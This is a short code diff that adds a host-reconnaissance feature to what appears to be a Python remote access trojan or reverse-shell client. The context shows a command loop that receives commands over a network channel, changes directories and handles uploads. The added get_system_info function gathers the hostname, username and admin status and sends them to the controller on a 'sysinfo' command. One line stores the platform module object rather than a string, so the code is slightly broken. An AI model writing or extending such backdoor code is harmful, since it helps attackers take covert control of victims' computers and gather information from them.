@@ -185,12 +185,23 @@ def unblock_peripherals():
     except Exception as e:
         print(e)
 
+def get_system_info():
+    info = {
+        'os': platform,
+        'hostname': socket.gethostname(),
+        'username': os.getlogin(),
+        'is_admin': is_admin()
+    }
+    return info
+
 def shell():
     while True:
         command = reliable_recv()
         print(command)
         if command == 'quit':
             break
+        elif command == 'sysinfo':
+            reliable_send(get_system_info())
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
         elif command[:6] == 'upload':
